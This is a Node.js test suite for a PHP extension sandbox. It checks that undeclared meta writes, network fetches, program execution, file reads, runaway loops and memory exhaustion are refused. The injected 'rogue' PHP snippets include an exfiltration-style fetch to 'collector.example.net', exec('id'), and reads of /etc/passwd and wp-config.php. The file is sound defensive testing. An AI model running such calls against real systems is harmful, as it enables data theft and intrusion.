/**
 * The sandbox in Node: the sample extension's declared calls work, and everything it doesn't
 * declare is refused at the bridge, or never exists in its PHP at all.
 */
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { readExtension, runInNode } from '../src/node.js';
import { refusal } from '../src/bridge.js';

const HERE = path.dirname( fileURLToPath( import.meta.url ) );
const SAMPLE = path.join( HERE, '..', 'sample', 'riff-sample' );
const manifest = JSON.parse( fs.readFileSync( path.join( SAMPLE, 'isolation.json' ), 'utf8' ) );
const files = readExtension( SAMPLE );

// A site in memory: one track, its meta, and a network that records what it was asked for.
function site() {
	const meta = new Map();
	const fetched = [];
	return {
		meta,
		fetched,
		track: async ( id ) => ( id === 7 ? { id: 7, title: 'So What', artist: 'Miles Davis' } : null ),
		getMeta: async ( id, key ) => meta.get( `${ id }:${ key }` ) ?? '',
		setMeta: async ( id, key, value ) => ( meta.set( `${ id }:${ key }`, value ), true ),
		fetch: async ( url ) => ( fetched.push( url ), { status: 200, body: JSON.stringify( [ 'modal', 'jazz' ] ) } ),
		registerView: async () => true,
	};
}

// The sample, with one more file that does what the test asks on the event.
const rogue = ( body ) => ( {
	...files,
	'rogue.php': `<?php\nadd_action( 'riff_sandbox_uploaded', static function ( int $id ): void {\n${ body }\n} );\n`,
} );
const run = ( options ) =>
	runInNode( {
		manifest,
		files,
		main: options.files?.[ 'rogue.php' ] ? 'rogue.php' : 'riff-sample.php',
		event: 'riff_sandbox_uploaded',
		args: [ 7 ],
		site: site(),
		...options,
	} );

test( 'the declared calls work: read a track, fetch a declared host, write its own meta', async () => {
	const s = site();
	const out = await run( { site: s } );
	assert.equal( out.timedOut, false );
	assert.match( out.text, /tagged 7: modal,jazz/ );
	assert.equal( s.meta.get( '7:_riff_sample_tags' ), 'modal,jazz' );
	assert.deepEqual( s.fetched, [ 'https://api.example.org/tags?title=So%20What' ] );
	assert.deepEqual( out.calls.map( ( c ) => [ c.op, c.ok ] ), [ [ 'track', true ], [ 'http.get', true ], [ 'meta.set', true ] ] );
	console.log( `boot ${ out.bootMs.toFixed( 0 ) } ms, job ${ out.runMs.toFixed( 0 ) } ms, total ${ out.totalMs.toFixed( 0 ) } ms` );
} );

test( 'a meta write outside its prefix is refused, and never reaches the site', async () => {
	const s = site();
	const out = await run( {
		site: s,
		files: rogue( "echo update_post_meta( $id, '_thumbnail_id', 99 ) ? 'WROTE' : 'refused';" ),
	} );
	assert.match( out.text, /refused/ );
	assert.equal( s.meta.has( '7:_thumbnail_id' ), false );
	const call = out.calls.find( ( c ) => c.args[ 1 ] === '_thumbnail_id' );
	assert.equal( call.ok, false );
	assert.match( call.why, /not under data.meta/ );
} );

test( 'a fetch to a host it does not declare is refused, and the host never makes it', async () => {
	const s = site();
	const out = await run( {
		site: s,
		files: rogue( "$r = wp_remote_get( 'https://collector.example.net/?' . $id ); echo is_wp_error( $r ) ? 'refused: ' . $r->get_error_message() : 'FETCHED';" ),
	} );
	assert.match( out.text, /refused: refused: collector.example.net is not in hosts/ );
	assert.ok( ! s.fetched.some( ( u ) => u.includes( 'collector' ) ) );
} );

test( 'PHP has no socket of its own to reach the network with', async () => {
	const out = await run( {
		files: rogue( "echo function_exists( 'fsockopen' ) ? 'HAS' : 'none', ' ', @file_get_contents( 'https://example.com/' ) === false ? 'nofetch' : 'FETCHED';" ),
	} );
	assert.match( out.text, /none nofetch/ );
} );

test( 'exec, and every way to run a program, is refused', async () => {
	const out = await run( {
		files: rogue( "foreach ( array( 'exec', 'shell_exec', 'system', 'passthru', 'proc_open', 'popen', 'mail' ) as $f ) { echo function_exists( $f ) ? \"HAS $f \" : ''; } try { exec( 'id' ); } catch ( \\Error $e ) { echo 'refused: ', $e->getMessage(); }" ),
	} );
	assert.doesNotMatch( out.text, /HAS/ );
	assert.match( out.text, /refused: Call to undefined function exec\(\)/ );
	assert.deepEqual( out.spawned, [] );
} );

test( 'a file outside its mount is not there to read', async () => {
	const here = fileURLToPath( import.meta.url );
	const out = await run( {
		files: rogue( `foreach ( array( '/etc/passwd', ${ JSON.stringify( here ) }, '/var/www/html/wp-config.php' ) as $f ) { echo @file_get_contents( $f ) === false ? 'none ' : "READ $f "; } echo implode( ',', array_diff( scandir( '/' ), array( '.', '..' ) ) );` ),
	} );
	assert.doesNotMatch( out.text, /READ/ );
	assert.match( out.text, /none none none/ );
	// Memory: the runtime's own folders, the stubs and the extension, nothing of the machine's.
	assert.doesNotMatch( out.text, /\b(Users|etc|var|usr)\b/ );
} );

test( 'an infinite loop is cut off at the time limit', async () => {
	const started = performance.now();
	const out = await run( { files: rogue( 'while ( true ) {}' ), timeout: 1500 } );
	assert.equal( out.timedOut, true );
	assert.ok( performance.now() - started < 4000, 'it ended near its limit' );
} );

test( 'it cannot raise its own limits', async () => {
	const out = await run( {
		files: rogue( "echo function_exists( 'ini_set' ) ? 'HAS' : 'none', ' ', ini_get( 'memory_limit' ), ' ', function_exists( 'set_time_limit' ) ? 'HAS' : 'none';" ),
	} );
	assert.match( out.text, /none 64M none/ );
} );

test( 'memory past its limit ends the job, not the host', async () => {
	const out = await run( { files: rogue( "$a = array(); while ( true ) { $a[] = str_repeat( 'x', 1048576 ); }" ) } );
	assert.match( out.text + out.errors, /Allowed memory size/ );
} );

test( 'an event it does not declare is not run', async () => {
	await assert.rejects( runInNode( { manifest, files, main: 'riff-sample.php', event: 'save_post', args: [], site: site() } ), /does not declare sandbox.events/ );
} );

test( 'the refusals read from the manifest alone', () => {
	assert.equal( refusal( manifest, 'meta.set', [ 1, '_riff_sample_x' ] ), null );
	assert.match( refusal( manifest, 'meta.set', [ 1, '_riff_samplex' ] ), /not under/ );
	assert.equal( refusal( manifest, 'http.get', [ 'https://api.example.org/x' ] ), null );
	assert.match( refusal( manifest, 'http.get', [ 'http://api.example.org/x' ] ), /only https/ );
	assert.match( refusal( manifest, 'http.get', [ 'https://api.example.org.evil.net/' ] ), /not in hosts/ );
	assert.match( refusal( manifest, 'view', [ 'x', {} ] ), /riff_register_view/ );
	assert.match( refusal( manifest, 'db.query', [] ), /there is no db.query/ );
} );
